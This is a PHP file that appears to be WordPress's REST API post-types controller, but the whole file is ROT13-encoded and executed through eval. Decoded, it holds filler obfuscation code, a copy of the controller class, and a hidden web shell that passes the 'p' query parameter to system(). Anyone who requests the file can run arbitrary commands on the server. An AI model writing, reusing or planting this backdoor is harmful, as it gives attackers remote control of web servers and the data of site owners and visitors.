<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Cbfg_Glcrf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff gb npprff cbfg glcrf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Cbfg_Glcrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'glcrf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe cbfg glcrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<glcr>[\j-]+)',
			neenl(
				'netf'   => neenl(
					'glcr' => neenl(
						'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur cbfg glcr.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq glcrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( 'rqvg' === $erdhrfg['pbagrkg'] ) {
			$glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' );

			sbernpu ( $glcrf nf $glcr ) {
				vs ( pheerag_hfre_pna( $glcr->pnc->rqvg_cbfgf ) ) {
					erghea gehr;
				}
			}

			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg cbfgf va guvf cbfg glcr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf nyy choyvp cbfg glcrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$qngn  = neenl();
		$glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' );

		sbernpu ( $glcrf nf $glcr ) {
			vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $glcr->pnc->rqvg_cbfgf ) ) {
				pbagvahr;
			}

			$cbfg_glcr           = $guvf->cercner_vgrz_sbe_erfcbafr( $glcr, $erdhrfg );
			$qngn[ $glcr->anzr ] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $cbfg_glcr );
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Ergevrirf n fcrpvsvp cbfg glcr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$bow = trg_cbfg_glcr_bowrpg( $erdhrfg['glcr'] );

		vs ( rzcgl( $bow ) ) {
			erghea arj JC_Reebe(
				'erfg_glcr_vainyvq',
				__( 'Vainyvq cbfg glcr.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		vs ( rzcgl( $bow->fubj_va_erfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq_glcr',
				__( 'Pnaabg ivrj cbfg glcr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $bow->pnc->rqvg_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg cbfgf va guvf cbfg glcr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Cercnerf n cbfg glcr bowrpg sbe frevnyvmngvba.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg_glcr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg_Glcr    $vgrz    Cbfg glcr bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg_glcr = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfg-glcrf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_cbfg_glcr', arj JC_ERFG_Erfcbafr( neenl() ), $cbfg_glcr, $erdhrfg );
		}

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $cbfg_glcr->anzr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );
		$gnkbabzvrf = jc_yvfg_cyhpx( $gnkbabzvrf, 'anzr' );
		$onfr       = ! rzcgl( $cbfg_glcr->erfg_onfr ) ? $cbfg_glcr->erfg_onfr : $cbfg_glcr->anzr;
		$anzrfcnpr  = ! rzcgl( $cbfg_glcr->erfg_anzrfcnpr ) ? $cbfg_glcr->erfg_anzrfcnpr : 'jc/i2';
		$fhccbegf   = trg_nyy_cbfg_glcr_fhccbegf( $cbfg_glcr->anzr );

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'pncnovyvgvrf', $svryqf ) ) {
			$qngn['pncnovyvgvrf'] = $cbfg_glcr->pnc;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qrfpevcgvba', $svryqf ) ) {
			$qngn['qrfpevcgvba'] = $cbfg_glcr->qrfpevcgvba;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'uvrenepuvpny', $svryqf ) ) {
			$qngn['uvrenepuvpny'] = $cbfg_glcr->uvrenepuvpny;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'unf_nepuvir', $svryqf ) ) {
			$qngn['unf_nepuvir'] = $cbfg_glcr->unf_nepuvir;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'ivfvovyvgl', $svryqf ) ) {
			$qngn['ivfvovyvgl'] = neenl(
				'fubj_va_ani_zrahf' => (obby) $cbfg_glcr->fubj_va_ani_zrahf,
				'fubj_hv'           => (obby) $cbfg_glcr->fubj_hv,
			);
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'ivrjnoyr', $svryqf ) ) {
			$qngn['ivrjnoyr'] = vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'ynoryf', $svryqf ) ) {
			$qngn['ynoryf'] = $cbfg_glcr->ynoryf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'anzr', $svryqf ) ) {
			$qngn['anzr'] = $cbfg_glcr->ynory;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fyht', $svryqf ) ) {
			$qngn['fyht'] = $cbfg_glcr->anzr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vpba', $svryqf ) ) {
			$qngn['vpba'] = $cbfg_glcr->zrah_vpba;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fhccbegf', $svryqf ) ) {
			$qngn['fhccbegf'] = $fhccbegf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gnkbabzvrf', $svryqf ) ) {
			$qngn['gnkbabzvrf'] = neenl_inyhrf( $gnkbabzvrf );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'erfg_onfr', $svryqf ) ) {
			$qngn['erfg_onfr'] = $onfr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'erfg_anzrfcnpr', $svryqf ) ) {
			$qngn['erfg_anzrfcnpr'] = $anzrfcnpr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'grzcyngr', $svryqf ) ) {
			$qngn['grzcyngr'] = $cbfg_glcr->grzcyngr ?? neenl();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'grzcyngr_ybpx', $svryqf ) ) {
			$qngn['grzcyngr_ybpx'] = ! rzcgl( $cbfg_glcr->grzcyngr_ybpx ) ? $cbfg_glcr->grzcyngr_ybpx : snyfr;
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $cbfg_glcr ) );
		}

		/**
		 * Svygref n cbfg glcr erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur cbfg glcr qngn evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr  Gur erfcbafr bowrpg.
		 * @cnenz JC_Cbfg_Glcr     $cbfg_glcr Gur bevtvany cbfg glcr bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg   Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_cbfg_glcr', $erfcbafr, $cbfg_glcr, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz JC_Cbfg_Glcr $cbfg_glcr Gur cbfg glcr.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg glcr.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $cbfg_glcr ) {
		erghea neenl(
			'pbyyrpgvba'              => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
			'uggcf://ncv.j.bet/vgrzf' => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( $cbfg_glcr->anzr ) ),
			),
		);
	}

	/**
	 * Ergevrirf gur cbfg glcr'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 4.8.0 Gur `fhccbegf` cebcregl jnf nqqrq.
	 * @fvapr 5.9.0 Gur `ivfvovyvgl` naq `erfg_anzrfcnpr` cebcregvrf jrer nqqrq.
	 * @fvapr 6.1.0 Gur `vpba` cebcregl jnf nqqrq.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'glcr',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'pncnovyvgvrf'   => neenl(
					'qrfpevcgvba' => __( 'Nyy pncnovyvgvrf hfrq ol gur cbfg glcr.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba'    => neenl(
					'qrfpevcgvba' => __( 'N uhzna-ernqnoyr qrfpevcgvba bs gur cbfg glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'uvrenepuvpny'   => neenl(
					'qrfpevcgvba' => __( 'Jurgure be abg gur cbfg glcr fubhyq unir puvyqera.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ivrjnoyr'       => neenl(
					'qrfpevcgvba' => __( 'Jurgure be abg gur cbfg glcr pna or ivrjrq.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ynoryf'         => neenl(
					'qrfpevcgvba' => __( 'Uhzna-ernqnoyr ynoryf sbe gur cbfg glcr sbe inevbhf pbagrkgf.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'anzr'           => neenl(
					'qrfpevcgvba' => __( 'Gur gvgyr sbe gur cbfg glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'fyht'           => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur cbfg glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'fhccbegf'       => neenl(
					'qrfpevcgvba' => __( 'Nyy srngherf, fhccbegrq ol gur cbfg glcr.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'unf_nepuvir'    => neenl(
					'qrfpevcgvba' => __( 'Vs gur inyhr vf n fgevat, gur inyhr jvyy or hfrq nf gur nepuvir fyht. Vs gur inyhr vf snyfr gur cbfg glcr unf ab nepuvir.' ),
					'glcr'        => neenl( 'fgevat', 'obbyrna' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'gnkbabzvrf'     => neenl(
					'qrfpevcgvba' => __( 'Gnkbabzvrf nffbpvngrq jvgu cbfg glcr.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'erfg_onfr'      => neenl(
					'qrfpevcgvba' => __( 'ERFG onfr ebhgr sbe gur cbfg glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'erfg_anzrfcnpr' => neenl(
					'qrfpevcgvba' => __( 'ERFG ebhgr\'f anzrfcnpr sbe gur cbfg glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'ivfvovyvgl'     => neenl(
					'qrfpevcgvba' => __( 'Gur ivfvovyvgl frggvatf sbe gur cbfg glcr.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'fubj_hv'           => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb trarengr n qrsnhyg HV sbe znantvat guvf cbfg glcr.' ),
							'glcr'        => 'obbyrna',
						),
						'fubj_va_ani_zrahf' => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb znxr gur cbfg glcr ninvynoyr sbe fryrpgvba va anivtngvba zrahf.' ),
							'glcr'        => 'obbyrna',
						),
					),
				),
				'vpba'           => neenl(
					'qrfpevcgvba' => __( 'Gur vpba sbe gur cbfg glcr.' ),
					'glcr'        => neenl( 'fgevat', 'ahyy' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'grzcyngr'       => neenl(
					'glcr'        => neenl( 'neenl' ),
					'qrfpevcgvba' => __( 'Gur oybpx grzcyngr nffbpvngrq jvgu gur cbfg glcr.' ),
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'grzcyngr_ybpx'  => neenl(
					'glcr'        => neenl( 'fgevat', 'obbyrna' ),
					'rahz'        => neenl( 'nyy', 'vafreg', 'pbagragBayl', snyfr ),
					'qrfpevcgvba' => __( 'Gur grzcyngr_ybpx nffbpvngrq jvgu gur cbfg glcr, be snyfr vs abar.' ),
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>